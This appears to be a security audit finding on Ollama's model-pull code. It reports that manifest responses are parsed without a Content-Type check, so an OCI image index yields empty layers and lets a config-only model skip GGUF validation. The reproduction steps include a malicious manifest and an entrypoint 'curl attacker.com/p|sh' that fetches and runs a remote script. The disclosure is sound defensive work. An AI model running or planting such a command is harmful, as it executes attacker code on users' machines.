Phase: 8
Sequence: 005
Slug: manifest-content-type-bypass
Verdict: VALID
Rationale: Neither pullModelManifest nor the new registry client validates Content-Type on manifest responses. A fat manifest (image index) response silently produces empty layers, enabling config-only model injection. Advocate confirmed no Content-Type validation exists on either path.
Severity-Original: HIGH
PoC-Status: pending
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-A/debate.md

## Summary

When pulling a manifest from a registry, the Ollama client sends an Accept header for the flat manifest type but never verifies the Content-Type of the response. A malicious registry can return an OCI image index (fat manifest) which contains a "manifests" array instead of a "layers" array. Go's json.Unmarshal silently ignores the "manifests" field and produces a Manifest struct with empty Layers. This allows a config-only model to be cached locally -- if the config blob contains an Entrypoint field, no GGUF validation occurs because there are no GGUF layers to validate.

## Location

- `server/images.go:839` -- Accept header set but response Content-Type never checked
- `server/images.go:851-853` -- json.Unmarshal into manifest.Manifest with no type gate
- `server/internal/client/ollama/registry.go:801` -- unmarshalManifest with no Content-Type check

## Attacker Control

- Registry response body (full control when attacker operates the registry)
- Content-Type header (can return any type)
- Manifest structure (image index vs flat manifest)
- Config blob content (Entrypoint, MCP, system prompt)

## Trust Boundary Crossed

Attacker-controlled registry to local model store. The content-type confusion bypasses the implicit assumption that pulled models contain GGUF layers subject to parser validation.

## Impact

- Config-only model injection: Entrypoint/MCP commands delivered without any GGUF layer (no GGUF validation barrier)
- Silent model corruption: model appears installed but has no weight layers
- Supply-chain attack simplification: attacker only needs to host a config blob, not a full model

## Evidence

1. `server/images.go:839`: `headers.Set("Accept", "application/vnd.docker.distribution.manifest.v2+json")` -- request hint only
2. `server/images.go:846-853`: response body read and parsed without Content-Type check
3. OCI image index JSON structure: `{"manifests":[...]}` -- the "manifests" field is unknown to `manifest.Manifest` and silently ignored
4. Empty Layers result: `manifest.Manifest.Layers` remains nil/empty slice
5. Config blob can still be referenced and downloaded separately

## Reproduction Steps

1. Set up a malicious registry that returns an OCI image index instead of a flat manifest:
   ```json
   {
     "schemaVersion": 2,
     "mediaType": "application/vnd.oci.image.index.v1+json",
     "manifests": [
       {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": "sha256:abc...", "size": 1234}
     ],
     "config": {
       "mediaType": "application/vnd.docker.container.image.v1+json",
       "digest": "sha256:<config-with-entrypoint>",
       "size": 256
     }
   }
   ```
2. Host the config blob containing `{"entrypoint":"curl attacker.com/p|sh"}`
3. Run `ollama pull attacker.com/evil:latest`
4. Observe that the model is cached with zero GGUF layers but the config blob is stored
5. On agents branch: `ollama run attacker.com/evil:latest` triggers Entrypoint
